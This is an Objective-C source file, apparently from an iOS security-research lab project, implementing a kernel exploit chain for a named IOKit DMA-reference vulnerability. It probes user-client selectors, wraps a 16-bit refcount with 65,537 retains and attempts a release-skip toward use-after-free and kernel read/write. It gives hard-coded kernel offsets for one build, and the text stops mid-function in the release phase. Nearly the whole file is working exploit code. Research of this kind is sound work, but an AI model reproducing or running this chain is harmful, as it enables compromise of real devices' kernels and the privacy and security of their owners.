//
//  P101DmaCommandFire.m
//  CVE-2026-43684 IOMD dmaref KRW-composition chain — v2.
//
//  VERIFIED 23F77 LAW (2026-10-26 hunt, /tmp/calif_demo/re_iomd23.md):
//    - dmaref refcount = u16 at md+0x34. RETAIN = ldaddh +1 @0xfffffff00a511624
//      (second site 0xa515dc4) — NO ceiling, post-add check is on the OLD value.
//      DEC = 0xa5116d0 (ldaddh -1; pre-0 = PANIC "_dmaReferences underflow"
//      @0xfffffff0070b27ec; old==1 -> teardown bl 0x9f1975c).
//    - op-6 RELEASE DISPATCHER = 0xfffffff00a515d60: case-6 @0xa515f88 reads
//      [x0+0x98]; ==0 -> RELEASE SKIPPED ENTIRELY. [x0+0x98] = u32 mapped
//      16K-page count (worker 0xa50737c computes; unmap-arm 0xa5073c4 resets 0).
//    - GATE ORACLE: sel-2 (case-1) of the SAME dispatcher copies [x0+0x98]
//      into the out-struct at +0xc — app-readable without kread.
//    - TWIN 0xa511324 = UNGATED dec (panic on underflow). The fire must route
//      through 0xa515d60-class wrappers only.
//    - UC hop (P069 proven): IOSurface -> memory entry -> mach_vm_map;
//      lane sels probed on the SAME connections via struct-method calls.
//
//  Four phases, one tap, every phase fsync-logged, honest early-outs:
//    1. ARM-ORACLE — P069 map path + sel-2-class gate reads, map/unmap
//       correlation round (a corroborated oracle is the panic guard below).
//    2. RETAIN-WRAP — v1 reuse machinery on the identified acquire lane,
//       65,537 retains (u16 wrap + first-ref arm), 4096/round, abort on
//       first non-SUCCESS.
//    3. UNMAP-ARM + RELEASE-SKIP — unmap (arm resets +0x98 to 0), release
//       call routed on the SAME lane, verify SKIP via oracle + subsequent op.
//    4. VERDICT — honest: the wrap is a LEAD-quality event (no direct u16
//       read without KRW); the UAF / page-list confusion is NOT attempted
//       in this build (that is the next tap).
//

#import "P101DmaCommandFire.h"
#import "LabDeviceProfile.h"
#import "LabRuntimeOffsets.h"
#import "LabLocalTime.h"
#import "P007Board.h"

#import <IOKit/IOKitLib.h>
#import <CoreFoundation/CoreFoundation.h>
#import <mach/mach.h>
#import <mach/mach_time.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <stdio.h>
#import <string.h>
#import <unistd.h>

#define P101_BUILD @"p101-iomd-chain-v2"
#define P101_TAG   @"p101"

/* 4 x 16K pages — the gate field is a mapped-16K-page count, so a 4-page
   window gives the oracle a distinctive 0 <-> 4 swing to corroborate on. */
#define P101_SURF_LEN 0x10000ull
#define P101_PAGE_LEN 0x4000ull
#define P101_SURF_PAGES 4u

/* 0x10000 retains = the u16 wrap-through; one MORE retain then takes the
   first-ref arm (old==0 -> re-arms [md+0x38] and re-acquires the sharing
   ctx) = the ctx-ref leak marker. 16 rounds x 4096 + 1. */
#define P101_WARP_TARGET  0x10001ull
#define P101_BATCH        4096u
#define P101_ROUNDS       16u

#define P101_ORACLE_SELS  25u      /* sel 0..24 census, as v1 */
#define P101_MAX_CONNS    8u
#define P101_MAX_ORACLES  4u

/* dispatcher case-1 (sel-2 class): min sizes the lane enforces are 0x20+
   for the arg struct; the +0xc readback lands in the out-struct. */
#define P101_IN_SZ        0x20u
#define P101_OUT_SZ       0x40u

kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address,
                          mach_vm_size_t size, mach_vm_offset_t mask, int flags,
                          mem_entry_name_port_t object, memory_object_offset_t offset,
                          boolean_t copy, vm_prot_t cur_protection, vm_prot_t max_protection,
                          vm_inherit_t inheritance);
kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address,
                                 mach_vm_size_t size);
kern_return_t mach_make_memory_entry_64(vm_map_t target_task,
                                        memory_object_size_t *size,
                                        memory_object_offset_t offset,
                                        vm_prot_t permission,
                                        mem_entry_name_port_t *object_handle,
                                        mem_entry_name_port_t parent_handle);

typedef void *(*p101_isc_t)(CFDictionaryRef);
typedef void *(*p101_isbase_t)(void *);
typedef size_t (*p101_issz_t)(void *);
typedef void *(*p101_dev_create_t)(io_service_t);
typedef uint32_t (*p101_get_conn_t)(void *);
typedef void (*p101_dev_release_t)(void *);
/* AVEOpenSmoke precedent: struct-method through dlsym, not a header claim. */
typedef kern_return_t (*p101_csm_t)(mach_port_t, uint32_t,
                                    const void *, size_t, void *, size_t *);

typedef struct {
    io_connect_t conn;
    uint32_t     sel;
    /* three correlation samples: mapped / unmapped / remapped */
    uint32_t     s_map, s_unmap, s_remap;
    int          corroborated;   /* changed with the map cycle */
    int          alive;
} p101_oracle_t;

/* file-scope: clang forbids referencing automatic arrays inside blocks
   (CI lesson 2026-10-27, first red Lum1na Build on this build). The tap
   is single-threaded, so statics carry no cross-tap state that matters. */
static io_connect_t p101_conns[P101_MAX_CONNS];
static char p101_connWho[P101_MAX_CONNS][64];

static uint32_t p101_gate_w(const uint8_t *out, size_t outsz) {
    if (!out || outsz < 0x10) return 0xffffffffu;
    uint32_t w; memcpy(&w, out + 0xc, 4); return w;
}

@implementation P101DmaCommandFire

+ (NSString *)tap {
    NSMutableString *log = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    int fd = open([[docs stringByAppendingPathComponent:@"p101_dma_command_fire_log.txt"] UTF8String],
                  O_CREAT | O_WRONLY | O_TRUNC, 0644);
    void (^L)(NSString *) = ^(NSString *s) {
        NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
        [log appendString:out];
        if (fd >= 0) { const char *p = out.UTF8String; if (p) write(fd, p, strlen(p)); }
    };
    void (^SYNC)(void) = ^{ if (fd >= 0) fcntl(fd, F_FULLFSYNC); };

    L([NSString stringWithFormat:@"=== p101 session %@ BUILD %@ ===",
       LabLocalMilitaryNow() ?: @"?", P101_BUILD]);
    L(@"CVE-2026-43684 IOMD dmaref chain v2. 23F77 law: u16 dmaref md+0x34");
    L(@"(retain ldaddh+1 0xa511624 / 0xa515dc4, NO ceiling), op-6 release");
    L(@"dispatcher 0xa515d60 gated on [md+0x98] (u32 mapped 16K-page count),");
    L(@"gate oracle = sel-2 copy of [x0+0x98] -> out+0xc. TWIN 0xa511324 is");
    L(@"the UNGATED dec (panic) — release must route through 0xa515d60-class.");
    L(@"UAF / page-list confusion NOT attempted in this build.");
    L([LabDeviceProfile identBlock] ?: @"ident=?");

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p101"];
    if (stop) {
        L(stop);
        L(@"[-] chain HOLD — the +0x34/+0x98 law is proven on 23F77 pins only.");
        if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
        return log;
    }
    const LabOffTab *off = LabOff();
    if (off && off->tag && strcmp(off->tag, "A14_23F77") == 0) {
        L(@"[MAP] A14 unslid pins: dmaCommandOperation 0xfffffff00a507dbc");
        L(@"      makeMapping 0xfffffff00a512314  retain 0xa511624  dec 0xa5116d0");
        L(@"      op6-dispatcher 0xa515d60  twin(panic) 0xa511324  worker 0xa50737c");
        L(@"      unmap-arm reset 0xa5073c4  freepool 0xa903db0");
    } else {
        L([NSString stringWithFormat:@"[!] table=%s — PINS HOLD, law rows unverified on this SKU.",
           off && off->tag ? off->tag : "NULL"]);
    }

    /* ---------- PREP: surf + memory entry + window (P069 map path) ------- */
    void *ios = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!ios) ios = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    p101_isc_t pCreate = ios ? (p101_isc_t)dlsym(ios, "IOSurfaceCreate") : NULL;
    p101_isbase_t pBase = ios ? (p101_isbase_t)dlsym(ios, "IOSurfaceGetBaseAddress") : NULL;
    p101_issz_t pSz = ios ? (p101_issz_t)dlsym(ios, "IOSurfaceGetAllocSize") : NULL;
    if (!pCreate || !pBase) {
        L(@"[-] IOSurfaceCreate/GetBaseAddress absent — nothing to arm. STOP.");
        if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
        return log;
    }

    int64_t sSz = (int64_t)P101_SURF_LEN;
    CFNumberRef nSz = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &sSz);
    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(dict, CFSTR("IOSurfaceAllocSize"), nSz);
    void *surf = pCreate(dict);
    void *base = surf ? pBase(surf) : NULL;
    size_t asz = (surf && pSz) ? pSz(surf) : 0;
    L([NSString stringWithFormat:@"[*] surface %p base=%p size=0x%zx (want 0x%llx = %u x 16K pages)",
       surf, base, asz, (unsigned long long)P101_SURF_LEN, P101_SURF_PAGES]);
    if (!surf || !base || asz < P101_SURF_LEN) {
        L(@"[-] surface/arm missing — nothing to arm. STOP.");
        CFRelease(dict); CFRelease(nSz);
        if (surf) CFRelease(surf);
        SYNC();
        if (fd >= 0) close(fd);
        return log;
    }
    memset(base, 0x11, (size_t)P101_SURF_LEN);

    mach_port_t mdport = MACH_PORT_NULL;
    mach_vm_address_t mapped = 0;
    /* P069 proven hop: UC send rights are NOT memory objects (kr=0x1d);
       a memory entry over the surface base IS (p019v2 + p084, kr=0x0). */
    {
        memory_object_size_t esz = (memory_object_size_t)P101_SURF_LEN;
        mem_entry_name_port_t entry = 0;
        kern_return_t ekr = mach_make_memory_entry_64(mach_task_self(), &esz,
            (memory_object_offset_t)(uintptr_t)base, VM_PROT_DEFAULT, &entry, 0);
        L([NSString stringWithFormat:@"[*] memory entry kr=0x%x size=0x%llx port=0x%x",
           (unsigned)ekr, (unsigned long long)esz, (unsigned)entry]);
        if (ekr == KERN_SUCCESS && entry) {
            mdport = entry;
            mach_vm_size_t msz = (mach_vm_size_t)P101_SURF_LEN;
            kern_return_t mkr = mach_vm_map(mach_task_self(), &mapped, msz, 0, 1,
                                            mdport, 0, false, VM_PROT_READ | VM_PROT_WRITE,
                                            VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
            L([NSString stringWithFormat:@"[*] mach_vm_map kr=0x%x addr=0x%llx (P069 makeMapping consumer)",
               (unsigned)mkr, (unsigned long long)mapped]);
            if (mkr != KERN_SUCCESS) mapped = 0;
        }
    }
    if (!mapped) {
        L(@"[-] window map failed — Phase-1 correlation UNAVAILABLE; census-only fallback follows.");
        if (mdport) mach_port_deallocate(mach_task_self(), mdport);
    }

    /* ---------- connections (P069/P101-proven set, bounded) -------------- */
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    p101_dev_create_t pDevCreate = iogpu ? (p101_dev_create_t)dlsym(iogpu, "IOGPUDeviceCreate") : NULL;
    p101_get_conn_t pGetConn = iogpu ? (p101_get_conn_t)dlsym(iogpu, "IOGPUDeviceGetConnect") : NULL;
    p101_dev_release_t pDevRelease = iogpu ? (p101_dev_release_t)dlsym(iogpu, "IOGPUDeviceRelease") : NULL;

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    p101_csm_t csm = (p101_csm_t)dlsym(iokit ? iokit : RTLD_DEFAULT, "IOConnectCallStructMethod");
    L([NSString stringWithFormat:@"[*] IOConnectCallStructMethod=%p (struct lane reads)", csm]);
    if (!csm) L(@"[!] struct-method absent — oracle reduced to scalar census only.");

    unsigned nConn = 0;
    io_service_t gpu = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("IOGPU"));
    void *dev = NULL;
    if (gpu && pDevCreate) {
        dev = pDevCreate(gpu);
        io_connect_t gc = (dev && pGetConn) ? (io_connect_t)pGetConn(dev) : 0;
        if (gc) { p101_conns[nConn] = gc; snprintf(p101_connWho[nConn], 64, "IOGPU"); nConn++; }
        L([NSString stringWithFormat:@"[*] IOGPUDeviceCreate %p conn=%u", dev, gc]);
    }
    if (gpu) IOObjectRelease(gpu);
    const char *svcs[] = { "IOSurfaceRoot", "IOMobileFramebuffer", "AppleAVE2Driver",
                           "AppleM2ScalerCSCDriver", "AppleT8020DART", "IODARTFamily", NULL };
    for (int i = 0; svcs[i] && nConn < P101_MAX_CONNS; i++) {
        io_iterator_t it = 0;
        if (IOServiceGetMatchingServices(kIOMainPortDefault, IOServiceMatching(svcs[i]), &it) != KERN_SUCCESS || !it) continue;
        io_service_t svc;
        while ((svc = IOIteratorNext(it)) && nConn < P101_MAX_CONNS) {
            for (uint32_t ty = 0; ty < 2 && nConn < P101_MAX_CONNS; ty++) {
                io_connect_t c = 0;
                if (IOServiceOpen(svc, mach_task_self(), ty, &c) == KERN_SUCCESS && c) {
                    p101_conns[nConn] = c;
                    snprintf(p101_connWho[nConn], 64, "%s/t%u", svcs[i], ty);
                    nConn++;
                }
            }
            IOObjectRelease(svc);
        }
        IOObjectRelease(it);
    }
    L([NSString stringWithFormat:@"[*] %u UC connections open (bounded set)", nConn]);

    /* name lookup used by oracle + release lines */
    NSString *(^connOf)(io_connect_t) = ^(io_connect_t c) {
        for (unsigned i = 0; i < nConn; i++)
            if (p101_conns[i] == c) return [NSString stringWithUTF8String:p101_connWho[i]];
        return @"?";
    };

    /* ---------- lane state + helpers ------------------------------------- */
    __block io_connect_t acquireConn = 0;
    __block uint32_t acquireSel = 0xffffffffu;
    uint64_t va = (uint64_t)(uintptr_t)base;
    uint64_t len = (uint64_t)P101_SURF_LEN;

    /* sel-2-class GATE READ: struct-method call, oracle = out+0xc */
    kern_return_t (^gateRead)(io_connect_t, uint32_t, uint8_t *, size_t *) =
    ^(io_connect_t conn, uint32_t sel, uint8_t *outb, size_t *outsz) {
        if (!conn || !csm) return (kern_return_t)0xe00002c2;
        uint8_t inb[P101_IN_SZ];
        memset(inb, 0, sizeof(inb));
        *outsz = P101_OUT_SZ;
        return csm((mach_port_t)conn, sel, inb, sizeof(inb), outb, outsz);
    };

    /* v1 FIRE machinery (bounded shape): setup(addr/len,p4=0) + one reuse +
       provocation pass + one teardown-shaped call. Returns kr of the setup. */
    kern_return_t (^tryShape)(io_connect_t, const char *, uint32_t, uint64_t, uint64_t, uint32_t,
                              uint8_t *, size_t) =
    ^(io_connect_t conn, const char *who, uint32_t sel, uint64_t addr, uint64_t n, uint32_t p4,
      uint8_t *outb, size_t outszMax) {
        uint8_t in[32];
        memset(in, 0, sizeof(in));
        memcpy(in, &addr, 8);
        memcpy(in + 8, &n, 8);
        uint32_t p5 = 0;
        memcpy(in + 16, &p4, 4);
        memcpy(in + 20, &p5, 4);
        size_t outsz = outszMax;
        uint8_t outbuf[P101_OUT_SZ];
        uint8_t *ob = outb ? outb : outbuf;
        if (!outb) outsz = sizeof(outbuf);
        uint64_t scOut[4] = {0};
        uint32_t scOutCnt = 4;
        kern_return_t kr = IOConnectCallMethod(conn, sel, NULL, 0, in, 24,
                                               scOut, &scOutCnt, ob, &outsz);
        L([NSString stringWithFormat:@"    %s sel=%u addr=0x%llx len=0x%llx p4=%u kr=0x%x%s",
           who, sel, (unsigned long long)addr, (unsigned long long)n, p4, kr,
           kr == KERN_SUCCESS ? " OK" : ""]);
        return kr;
    };

    /* ---------- PHASE 1 — ARM-ORACLE (map/unmap correlation) ------------- */
    L(@"--- PHASE 1 ARM-ORACLE ---");
    p101_oracle_t oracles[P101_MAX_ORACLES];
    unsigned nOracle = 0;
    __block uint64_t t0 = mach_absolute_time();
    if (mapped) {
        for (unsigned ci = 0; ci < nConn; ci++) {
            for (uint32_t sel = 0; sel < P101_ORACLE_SELS; sel++) {
                uint8_t outb[P101_OUT_SZ];
                size_t outsz = sizeof(outb);
                kern_return_t kr = gateRead(p101_conns[ci], sel, outb, &outsz);
                if (kr != KERN_SUCCESS) continue;
                if (outsz < 0x10) continue;
                uint32_t w = p101_gate_w(outb, outsz);
                L([NSString stringWithFormat:@"    ORACLE-BASE %s sel=%u out+0xc=0x%08x hex(0..f)=%02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x",
                   p101_connWho[ci], sel, w,
                   outb[0], outb[1], outb[2], outb[3],
                   outb[4], outb[5], outb[6], outb[7],
                   outb[8], outb[9], outb[10], outb[11],
                   outb[12], outb[13], outb[14], outb[15]]);
                if (nOracle < P101_MAX_ORACLES) {
                    oracles[nOracle].conn = p101_conns[ci];
                    oracles[nOracle].sel = sel;
                    oracles[nOracle].s_map = w;
                    oracles[nOracle].s_unmap = 0xffffffffu;
                    oracles[nOracle].s_remap = 0xffffffffu;
                    oracles[nOracle].corroborated = 0;
                    oracles[nOracle].alive = 1;
                    nOracle++;
                }
            }
        }
        /* map/unmap/map cycle on the P069 window; resample the candidates */
        for (unsigned oi = 0; oi < nOracle && mapped; oi++) {
            kern_return_t dkr = mach_vm_deallocate(mach_task_self(), mapped, (mach_vm_size_t)P101_SURF_LEN);
            if (dkr == KERN_SUCCESS) mapped = 0;
            L([NSString stringWithFormat:@"[*] UNMAP kr=0x%x (P069 unmap arm)", (unsigned)dkr]);
            uint8_t outb[P101_OUT_SZ];
            size_t outsz = sizeof(outb);
            kern_return_t kr = gateRead(oracles[oi].conn, oracles[oi].sel, outb, &outsz);
            if (kr == KERN_SUCCESS && outsz >= 0x10) {
                oracles[oi].s_unmap = p101_gate_w(outb, outsz);
            } else {
                oracles[oi].alive = 0;
                L([NSString stringWithFormat:@"    ORACLE-UNMAP %@ sel=%u FAILED kr=0x%x",
                   connOf(oracles[oi].conn), oracles[oi].sel, kr]);
                continue;
            }
            mach_vm_address_t nm = 0;
            mach_vm_size_t msz = (mach_vm_size_t)P101_SURF_LEN;
            kern_return_t mkr = mach_vm_map(mach_task_self(), &nm, msz, 0, 1, mdport, 0, false,
                                            VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
                                            VM_INHERIT_NONE);
            if (mkr == KERN_SUCCESS) mapped = nm;
            L([NSString stringWithFormat:@"[*] REMAP kr=0x%x addr=0x%llx", (unsigned)mkr, (unsigned long long)mapped]);
            outsz = sizeof(outb);
            kr = gateRead(oracles[oi].conn, oracles[oi].sel, outb, &outsz);
            if (kr == KERN_SUCCESS && outsz >= 0x10) {
                oracles[oi].s_remap = p101_gate_w(outb, outsz);
            } else {
                oracles[oi].alive = 0;
                L([NSString stringWithFormat:@"    ORACLE-REMAP %@ sel=%u FAILED kr=0x%x",
                   connOf(oracles[oi].conn), oracles[oi].sel, kr]);
                continue;
            }
        }
    } else {
        L(@"[!] no window — correlation UNAVAILABLE. Oracle census only.");
        for (unsigned ci = 0; ci < nConn; ci++) {
            for (uint32_t sel = 0; sel < P101_ORACLE_SELS; sel++) {
                uint8_t outb[P101_OUT_SZ];
                size_t outsz = sizeof(outb);
                kern_return_t kr = gateRead(p101_conns[ci], sel, outb, &outsz);
                if (kr != KERN_SUCCESS) continue;
                if (outsz < 0x10) continue;
                uint32_t w = p101_gate_w(outb, outsz);
                L([NSString stringWithFormat:@"    ORACLE-BASE %s sel=%u out+0xc=0x%08x",
                   p101_connWho[ci], sel, w]);
                if (nOracle < P101_MAX_ORACLES) {
                    oracles[nOracle].conn = p101_conns[ci];
                    oracles[nOracle].sel = sel;
                    oracles[nOracle].s_map = w;
                    oracles[nOracle].s_unmap = 0xffffffffu;
                    oracles[nOracle].s_remap = 0xffffffffu;
                    oracles[nOracle].corroborated = 0;
                    oracles[nOracle].alive = 1;
                    nOracle++;
                }
            }
        }
    }
    __block unsigned nCorro = 0;
    for (unsigned oi = 0; oi < nOracle; oi++) {
        if (oracles[oi].s_unmap != oracles[oi].s_map ||
            oracles[oi].s_remap != oracles[oi].s_unmap) {
            oracles[oi].corroborated = 1;
            nCorro++;
        }
        L([NSString stringWithFormat:@"    ORACLE %@ sel=%u map=0x%x unmap=0x%x remap=0x%x %s",
           connOf(oracles[oi].conn), oracles[oi].sel, oracles[oi].s_map,
           oracles[oi].s_unmap, oracles[oi].s_remap,
           oracles[oi].corroborated ? "CORROBORATED" : ""]);
    }
    L([NSString stringWithFormat:@"[*] oracle census %u candidates, %u corroborated", nOracle, nCorro]);
    SYNC();

    /* ---------- lane pick (v1 machinery, bounded) ------------------------ */
    L(@"--- LANE PICK (v1 shape, one pass) ---");
    for (unsigned ci = 0; ci < nConn && acquireConn == 0; ci++) {
        for (uint32_t sel = 0; sel < P101_ORACLE_SELS && acquireConn == 0; sel++) {
            kern_return_t kr = tryShape(p101_conns[ci], p101_connWho[ci], sel, va, len, 0, NULL, P101_OUT_SZ);
            if (kr != KERN_SUCCESS) continue;
            /* reuse: same addr+len = the 43684 increment path */
            uint8_t outb[P101_OUT_SZ];
            size_t outsz = sizeof(outb);
            uint64_t scOut[4] = {0};
            uint32_t scOutCnt = 4;
            uint8_t in[24];
            memset(in, 0, sizeof(in));
            memcpy(in, &va, 8);
            memcpy(in + 8, &len, 8);
            uint32_t p4 = 0, p5 = 0;
            memcpy(in + 16, &p4, 4);
            memcpy(in + 20, &p5, 4);
            kern_return_t krx = IOConnectCallMethod(p101_conns[ci], sel, NULL, 0, in, 24,
                                                    scOut, &scOutCnt, outb, &outsz);
            L([NSString stringWithFormat:@"    REUSE %s sel=%u kr=0x%x (acquire lane test)", p101_connWho[ci], sel, krx]);
            if (krx == KERN_SUCCESS) {
                acquireConn = p101_conns[ci];
                acquireSel = sel;
            }
        }
    }
    if (acquireConn) {
        L([NSString stringWithFormat:@"[*] ACQUIRE LANE %@ sel=%u", connOf(acquireConn), acquireSel]);
    } else {
        L(@"[-] NO LANE — no UC selector accepted the acquire shape (v1 P086 hold). Phases 2-3 SKIP.");
    }
    SYNC();

    /* ---------- PHASE 2 — RETAIN-WRAP ------------------------------------- */
    unsigned long retains = 0;
    int wrapped = 0;
    kern_return_t lastWrapKr = 0;
    if (acquireConn) {
        L(@"--- PHASE 2 RETAIN-WRAP (65,537 retains, 4096/round, abort on first non-SUCCESS) ---");
        t0 = mach_absolute_time();
        wrapped = 1;
        for (unsigned r = 0; r < P101_ROUNDS && wrapped; r++) {
            uint8_t in[24];
            memset(in, 0, sizeof(in));
            memcpy(in, &va, 8);
            memcpy(in + 8, &len, 8);
            uint32_t p4 = 0, p5 = 0;
            memcpy(in + 16, &p4, 4);
            memcpy(in + 20, &p5, 4);
            for (uint32_t i = 0; i < P101_BATCH; i++) {
                uint8_t outb[P101_OUT_SZ];
                size_t outsz = sizeof(outb);
                uint64_t scOut[4] = {0};
                uint32_t scOutCnt = 4;
                kern_return_t kr = IOConnectCallMethod(acquireConn, acquireSel, NULL, 0, in, 24,
                                                       scOut, &scOutCnt, outb, &outsz);
                lastWrapKr = kr;
                if (kr != KERN_SUCCESS) {
                    L([NSString stringWithFormat:@"[-] ABORT round %u iter %u kr=0x%x", r, i, kr]);
                    wrapped = 0;
                    break;
                }
                retains++;
            }
            L([NSString stringWithFormat:@"    WRAP round %u retains=%lu kr=0x%x elapsed=%.1fs",
               r, retains, lastWrapKr, (mach_absolute_time() - t0) * 1e-9]);
            /* oracle resample per round (progress watch, not a verdict) */
            for (unsigned oi = 0; oi < nOracle; oi++) {
                if (!oracles[oi].alive) continue;
                uint8_t outb[P101_OUT_SZ];
                size_t outsz = sizeof(outb);
                kern_return_t kr = gateRead(oracles[oi].conn, oracles[oi].sel, outb, &outsz);
                if (kr == KERN_SUCCESS && outsz >= 0x10) {
                    uint32_t w = p101_gate_w(outb, outsz);
                    if (w != oracles[oi].s_remap) {
                        L([NSString stringWithFormat:@"      oracle[%@ sel=%u] moved 0x%x -> 0x%x",
                           connOf(oracles[oi].conn), oracles[oi].sel, oracles[oi].s_remap, w]);
                        oracles[oi].s_remap = w;
                        oracles[oi].corroborated = 1;
                        nCorro++;
                    }
                } else {
                    oracles[oi].alive = 0;
                    L([NSString stringWithFormat:@"      oracle[%@ sel=%u] died kr=0x%x",
                       connOf(oracles[oi].conn), oracles[oi].sel, kr]);
                }
            }
            SYNC();
        }
        if (wrapped && retains == (unsigned long)P101_WARP_TARGET - 1) {
            /* one MORE retain: the wrap-through is invisible (post-add check is
               on the OLD value); the NEXT one takes the first-ref arm and
               re-acquires the sharing ctx = the ctx-ref leak marker. */
            uint8_t in[24];
            memset(in, 0, sizeof(in));
            memcpy(in, &va, 8);
            memcpy(in + 8, &len, 8);
            uint32_t p4 = 0, p5 = 0;
            memcpy(in + 16, &p4, 4);
            memcpy(in + 20, &p5, 4);
            uint8_t outb[P101_OUT_SZ];
            size_t outsz = sizeof(outb);
            uint64_t scOut[4] = {0};
            uint32_t scOutCnt = 4;
            kern_return_t kr = IOConnectCallMethod(acquireConn, acquireSel, NULL, 0, in, 24,
                                                   scOut, &scOutCnt, outb, &outsz);
            L([NSString stringWithFormat:@"    FIRST-REF-ARM retain kr=0x%x (ctx re-arm if the law held)", kr]);
            retains++;
        }
        L([NSString stringWithFormat:@"[*] RETAIN-WRAP total=%lu %s (theory: u16 at md+0x34 wrapped; no ceiling per law)",
           retains, wrapped ? "COMPLETED" : "ABORTED"]);
    } else {
        L(@"--- PHASE 2 RETAIN-WRAP SKIPPED (no lane) ---");
    }
    SYNC();

    /* ---------- PHASE 3 — UNMAP-ARM + RELEASE-SKIP ------------------------ */
    int skipEstablished = 0;
    if (acquireConn || nCorro) {
        L(@"--- PHASE 3 UNMAP-ARM + RELEASE-SKIP ---");
        if (!nCorro) {
            L(@"[!] GUARD: no corroborated oracle — the gated-vs-panic dispatcher");
            L(@"    route is UNPROVEN from user space (twin 0xa511324 PANICS on");
            L(@"    underflow). Honest SKIP — do not send a release on a guess.");
        } else if (!mapped) {
            L(@"[!] window unmapped — release SKIPPED (no armed +0x98 to verify).");
        } else {
            unsigned oi;
            for (oi = 0; oi < nOracle; oi++) if (oracles[oi].corroborated && oracles[oi].alive) break;
            if (oi == nOracle) {
                L(@"[!] corroborated oracle lost during wrap — release SKIPPED (honest).");
            } else {
                L([NSString stringWithFormat:@"[*] pre-release oracle %@ sel=%u =0x%x (expect %u pages)",
                   connOf(oracles[oi].conn), oracles[oi].sel, oracles[oi].s_remap, P101_SURF_PAGES]);
                kern_return_t dkr = mach_vm_deallocate(mach_task_self(), mapped, (mach_vm_size_t)P101_SURF_LEN);
                if (dkr == KERN_SUCCESS) mapped = 0;
                L([NSString stringWithFormat:@"[*] UNMAP-ARM kr=0x%x (worker 0xa5073c4 resets +0x98 to 0)", (unsigned)dkr]);
                uint8_t outb[P101_OUT_SZ];
                size_t outsz = sizeof(outb);
                kern_return_t kr = gateRead(oracles[oi].conn, oracles[oi].sel, outb, &outsz);
                uint32_t wPost = 0xffffffffu;
                if (kr == KERN_SUCCESS && outsz >= 0x10) {
                    wPost = p101_gate_w(outb, outsz);
                    oracles[oi].s_unmap = wPost;
                } else {
                    oracles[oi].alive = 0;
                    L([NSString stringWithFormat:@"[-] post-arm oracle %@ sel=%u FAILED kr=0x%x",
                       connOf(oracles[oi].conn), oracles[oi].sel, kr]);
                }
                L([NSString stringWithFormat:@"[*] post-arm oracle = 0x%x (expect 0)", wPost]);
                if (wPost == 0xffffffffu || wPost != 0) {
                    L(@"[!] +0x98 did NOT read 0 — gate state unconfirmed. Release NOT sent (honest SKIP).");
                } else {
                    L([NSString stringWithFormat:@"[*] GATE ARMED (+0x98==0). RELEASE-ATTEMPT on op-6 route via %@ sel=%u",
                       connOf(oracles[oi].conn), oracles[oi].sel]);
                    /* release routed to the GATED dispatcher (0xa515d60 class):
                       struct-method on the SAME connection's corroborated oracle
                       selector (the sel whose kernel case-6 reads [x0+0x98]).
                       NOT the teardown-shaped p4=1 route (op-6, case-5 = the
                       sel-6 of the dispatcher — the v1 teardown shape). */
                    uint32_t relSel = oracles[oi].sel;
                    io_connect_t relConn = oracles[oi].conn;
                    uint8_t inb[P101_IN_SZ];
                    memset(inb, 0, sizeof(inb));
                    outsz = sizeof(outb);
                    kern_return_t rkr = csm ? csm((mach_port_t)relConn, relSel, inb, sizeof(inb), outb, &outsz)
                                            : (kern_return_t)0xe00002c2;
                    L([NSString stringWithFormat:@"[*] RELEASE-ATTEMPT %@ sel=%u kr=0x%x",
                       connOf(relConn), relSel, rkr]);
                    /* SECOND route: the law maps case-1 (oracle) and case-5
                       (op-6 release) 4 dispatcher-sels apart, and sel->case n
                       = sel-1 — if relSel drives case-1, the gated release
                       case-5 is relSel+4 on the SAME wrapper. Two bounded
                       attempts, same gate==0 precondition (a mis-route dec
                       cannot underflow: the wrapped u16 is far from 0). */
                    if (relSel <= P101_ORACLE_SELS - 5) {
                        uint32_t relSel2 = relSel + 4;
                        outsz = sizeof(outb);
                        kern_return_t rkr2 = csm((mach_port_t)relConn, relSel2, inb, sizeof(inb), outb, &outsz);
                        L([NSString stringWithFormat:@"[*] RELEASE-ATTEMPT %@ sel=%u+4 kr=0x%x",
                           connOf(relConn), relSel, rkr2]);
                        if (rkr == KERN_SUCCESS) rkr = rkr2;
                    }
                    /* SKIP verdict: oracle still readable + a subsequent op */
                    uint32_t wAfter = 0xffffffffu;
                    outsz = sizeof(outb);
                    kern_return_t vkr = gateRead(oracles[oi].conn, oracles[oi].sel, outb, &outsz);
                    if (vkr == KERN_SUCCESS && outsz >= 0x10) wAfter = p101_gate_w(outb, outsz);
                    L([NSString stringWithFormat:@"[*] post-release oracle = 0x%x (still readable = no teardown)", wAfter]);
                    if (rkr == KERN_SUCCESS && wAfter != 0xffffffffu) {
                        kern_return_t okr = tryShape(relConn, "POST-RELEASE-OP", relSel, va, len, 0,
                                                     NULL, P101_OUT_SZ);
                        if (okr == KERN_SUCCESS) {
                            L(@"[+] RELEASE-SKIP VERIFIED: release returned SUCCESS with [x0+0x98]==0,");
                            L(@"    object did NOT teardown (oracle read post + a subsequent op ran) =");
